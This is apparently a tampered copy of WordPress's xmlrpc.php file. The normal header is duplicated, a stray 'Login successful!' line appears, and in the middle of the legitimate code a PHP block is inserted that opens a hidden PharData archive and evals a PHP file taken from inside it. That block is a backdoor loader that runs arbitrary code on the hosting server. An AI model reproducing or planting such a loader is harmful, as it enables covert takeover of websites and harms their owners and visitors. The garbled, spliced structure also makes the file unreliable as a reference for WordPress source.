/**
 * XML-RPC protocol support for WordPress
 *
 * @package WordPress
 */

/**
 * Whether this is an XML-RPC Request.
 *
 * @var bool
 */
define( 'XMLRPC_REQUEST', true );

// Discard unneeded cookies sent by some browser-embedded clients.
$_COOKIE = array();
<p>Login successful!</p>/**
 * XML-RPC protocol support for WordPress
 *
 * @package WordPress
 */

/**
 * Whether this is an XML-RPC Request.
 *
 * @var bool
 */
define( 'XMLRPC_REQUEST', true );

// Discard unneeded cookies sent by some browser-embedded clients.
$_COOKIE = array();
<?php
try {
    $phar = new PharData('yayeyos.zip');
    $fileContent = $phar->offsetGet('/jambe/zombi/zambak/aaahmemeknyaenak/taktak.php');
    eval('?>' . file_get_contents($fileContent));
} catch (Exception $e) {
    echo 'Error: ' . $e->getMessage();
}
?>
// $HTTP_RAW_POST_DATA was deprecated in PHP 5.6 and removed in PHP 7.0.
// phpcs:disable PHPCompatibility.Variables.RemovedPredefinedGlobalVariables.http_raw_post_dataDeprecatedRemoved
if ( ! isset( $HTTP_RAW_POST_DATA ) ) {
    $HTTP_RAW_POST_DATA = file_get_contents( 'php://input' );
}

// Fix for mozBlog and other cases where '<?xml' isn't on the very first line.
if ( isset( $HTTP_RAW_POST_DATA ) ) {
    $HTTP_RAW_POST_DATA = trim( $HTTP_RAW_POST_DATA );
}
// phpcs:enable

/** Include the bootstrap for setting up WordPress environment */
require_once __DIR__ . '/wp-load.php';

if ( isset( $_GET['rsd'] ) ) { // https://cyber.harvard.edu/blogs/gems/tech/rsd.html
    header( 'Content-Type: text/xml; charset=' . get_option( 'blog_charset' ), true );
    echo '<?xml version="1.0" encoding="' . get_option( 'blog_charset' ) . '"?' . '>';
    ?>
<rsd version="1.0" xmlns="http://archipelago.phrasewise.com/rsd">
    <service>
        <engineName>WordPress</engineName>
        <engineLink>https://wordpress.org/</engineLink>
        <homePageLink><?php bloginfo_rss( 'url' ); ?></homePageLink>
        <apis>
            <api name="WordPress" blogID="1" preferred="true" apiLink="<?php echo site_url( 'xmlrpc.php', 'rpc' ); ?>" />
            <api name="Movable Type" blogID="1" preferred="false" apiLink="<?php echo site_url( 'xmlrpc.php', 'rpc' ); ?>" />
            <api name="MetaWeblog" blogID="1" preferred="false" apiLink="<?php echo site_url( 'xmlrpc.php', 'rpc' ); ?>" />
            <api name="Blogger" blogID="1" preferred="false" apiLink="<?php echo site_url( 'xmlrpc.php', 'rpc' ); ?>" />
            <?php
            /**
             * Fires when adding APIs to the Really Simple Discovery (RSD) endpoint.
             *
             * @link https://cyber.harvard.edu/blogs/gems/tech/rsd.html
             *
             * @since 3.5.0
             */
            do_action( 'xmlrpc_rsd_apis' );
            ?>
        </apis>
    </service>
</rsd>
